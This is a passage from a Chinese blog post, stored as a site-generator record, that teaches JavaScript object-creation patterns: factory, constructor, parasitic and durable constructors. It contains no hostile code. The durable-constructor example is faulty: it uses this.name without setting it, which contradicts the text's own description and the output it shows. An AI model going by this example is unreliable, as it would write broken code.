136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在上述几种模式都不适合的情况下可以使用寄生构造函数模式。这种模式的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回新创建的对象，但从表面看，这个函数又很像典型的构造函数。来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br>&nbsp; o.name = name;<br>&nbsp; o.age = age;\n &nbsp; &nbsp;<br>&nbsp; o.job = job;\n &nbsp; &nbsp;<br>&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br>&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;} &nbsp; &nbsp;<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"> &nbsp; &nbsp; &nbsp;return</span> o;\n}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"banzhuan\"</span>);\nperson.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//\"wei\"</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person</span>函数创建了一个对象，并以相应的属性和方法初始化该对象，然后返回了这个对象。除了使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符把使用的包装函数叫做构造函数之外，这个模式和工厂模式并没有多大的区别。构造函数在不返回值的情况下，会默认返回新对象的实例。而通过在构造函数的末尾添加一个<span style=\"color: rgb(0, 128, 255);\">return</span>语句，可以重写调用构造函数时返回的值。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个模式可以在特殊的情况下来为对象创建构造函数。假设我们想创建一个具有额外方法的特殊数组。由于不能直接修改Array构造函数，因此可以使用这个模式：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">SpecialArray</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"><br> &nbsp; &nbsp;//创建数组</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br> &nbsp; &nbsp;var</span> values = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Array</span>(); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加值</span><br> &nbsp; &nbsp;values.push.apply(values,<span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">arguments</span>); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加方法</span><br> &nbsp; &nbsp;values.toPipedString = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>\n &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.join(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"|\"</span>);<br>} &nbsp; &nbsp;<br> <br> <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">&nbsp; &nbsp;//返回数组</span><br> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp;return</span> values;<br> }<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> colors = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> SpecialArray(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"red\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"blue\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"green\"</span>);<br>console.log(colors.toPipedString());<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//red|blue|green</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，我们创建了一个名为<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>的构造函数。在这个函数的内部，首先创建了一个数组，然后<span style=\"color: rgb(0, 128, 255);\">push()</span>方法初始化了数组的值。随后又给数组实例添加了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法，用来返回以竖线分隔的数组值。最后将数组以函数的形式返回。接着，我们调用了<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>构造函数，传入了初始化的值，并调用了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于寄生构造函数模式，有一点需要声明：首先，返回的对象与构造函数或者构造函数的原型没有任何关系；也就是说，构造函数返回的对象与在构造函数外部创建的对象没有什么不同。为此，不能依赖instanceof操作符来确定对象的类型。由于存在这一的问题，我们建议在可以使用其他模式的情况下不要使用这种模式。<br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>七、稳妥构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;道格拉斯·克拉克福德发明了JavaScript中的稳妥对象这个概念。所谓<span style=\"color: rgb(247, 92, 47);\"><strong>稳妥对象，是指没有公共属性，而且其方法也不引用this对象</strong></span>。稳妥对象最适合在一些安全环境中（这些环境会禁止使用this和new），或者在防止数据被其他应用程序改动时使用。稳妥构造函数遵循的与寄生构造函数类似的模式，但又两点不同：一是新创建对象的实例方法不引用this；二是不使用new操作符调用构造函数。按照稳妥构造函数的要求，可以将前面的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数重写如下：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;//创建要返回的新对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp; <br>&nbsp; &nbsp;var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>(); <br> &nbsp;<br><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;//可以在这里定义私有变量和函数 &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;//添加方法</span><br>&nbsp; &nbsp;o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>&nbsp;<br>&nbsp; &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;<br>&nbsp; &nbsp;}; &nbsp; &nbsp;<br><br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//返回对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br>&nbsp; &nbsp;return</span> o;<br> &nbsp; &nbsp;}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意，在以这种模式创建的对象中，除了使用<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法之外，没有其他办法访问<span style=\"color: rgb(0, 128, 255);\">name</span>的值。可以像下面使用稳妥的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person =Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"weiqi\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">22</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"banzhuan\"</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//weiqi</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样，变量<span style=\"color: rgb(0, 128, 255);\">person</span>中保存的是一个稳妥对象，而除了<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法外，没有别的方式可以访问其他数据成员。即使有其他代码会给这个对象添加方法或数据成员，但也不可能有别的办法访问传入到构造函数中的原始数据。稳妥构造函数模式提供的这种安全性，使得他非常适合在某些安全执行环境–例如，ADsafe(www.adsafe.org)提供的环境下使用。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: rgb(247, 92, 47);\"><strong>注意：与寄生构造函数模式类似，使用稳妥构造函数模式创建的对象与构造函数之间没有什么关系，因此instanceof操作符对这种对象也没有意义。</strong></span></span></p>\n \n>转自：http://blog.csdn.net/u014346301/article/details/52204967","source":"_posts/JavaScript创建对象的七种模式.md","raw":"---\ntitle: JavaScript创建对象的七种模式\ndate: 2016-10-11 13:16:14\ntags: Web\ncategories: Web\n---\n\n<section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ECMA-262把<span style=\"color: rgb(0, 128, 255);\">对象</span>定义为：”无需属性的集合，其属性可以包含基本值、对象或者函数。”严格来讲，这就相当于说明对象是一组没有特定顺序的值。对象的每个属性或方法都有一个名字，而每个名字都映射到一个值。正因为这样，我们可以把ECMAScript的对象想象成散列表：无非就是一组名对值，其中值可以是数据或函数。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义对象最简单的方式就是创建一个<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，然后再为他添加属性和方法，如下所示：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102);\">Object</span>();、</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.name = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">\"liubei\"</span>;</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.age = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 102, 102);\">29</span>;<br>person.job = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">\"shayemuyou\"</span>;<br><br>person.sayName = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 12px; color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp;<br>&nbsp; alert(<span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子创建了一个名为<span style=\"color: rgb(0, 128, 255);\">person</span>的对象，并为他添加了三个属性和一个方法。其中<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法用于显示name属性，<span style=\"color: rgb(0, 128, 255);\">this.name</span>将被解析为person.name，早期的开发人员经常使用这个模式来创建对象，后来对象字面量的方法成了创建对象的首选模式，上面的例子用对象字面量的语法可以写成如下这样：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = {\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;name:<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"liubei\"</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;age:<span class=\"\" style=\"color: rgb(0, 102, 102);\">29</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;job:<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"shayemuyou\"</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;sayName:<span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;}<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个例子中的<span style=\"color: rgb(0, 128, 255);\">person</span>对象和前面的对象是一样的，都有相同的属性和方法。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然<span style=\"color: rgb(0, 128, 255);\">Object</span>构造函数或者对象字面量的方法都可以用来创建单个对象，但是这些方法有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为了解决这个方法，人们开始使用工厂模式的一种变体。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47); font-size: 14px;\"><strong><span style=\"color: rgb(247, 92, 47);\">一、工厂模式</span></strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工厂模式是软件工程领域一种广为人知的设计模式，这种模式抽象了创建具体对象的过程</strong></span><span style=\"color: rgb(136, 136, 136);\">。考虑到ECMAScript中无法创建类，开发人员就发明了一种函数，用函数来封装以特定接口创建对象的细节，如下所示：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">createPerson</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span>\n <br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.name = name; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.age = age; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.job = job;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;<br>&nbsp; }<br> &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person1 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"software\"</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person2 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"bu\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"software\"</span>);</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;函数<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>能够根据接受的参数来构建一个包含所有必要信息的<span style=\"color: rgb(0, 128, 255);\">Person</span>对象。可以多次调用这个函数，每次都会返回一个包含三个属性一个方法的对象。工厂模式虽然解决了创建多个相似对象的问题，但却没有解决对象识别的问题，即怎么样知道这是哪个对象类型。</span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>二、构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;像Array、Object这样的原生构造函数，在运行时会自动出现在执行环境中。此外，我们可以创建自定义个构造函数，从而定义自定义类型的属性和方法。例如，我们可以使用构造函数重写上个例子：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{<span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;this</span>.name = name;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.age = age;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.job = job;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"software\"</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"bu\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"software\"</span>);</span></code></pre><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person()</span>函数取代了<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>函数，我们注意到<span style=\"color: rgb(0, 128, 255);\">Person()</span>与<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>的不同之处在于：</span></p><ul class=\"list-paddingleft-2\"><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有显式的创建对象</span></p></li><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">直接将属性和方法赋值给this对象</span></p></li><li><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有return语句&nbsp;</span></p></section></li></ul><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此外，还应该<span style=\"color: rgb(247, 92, 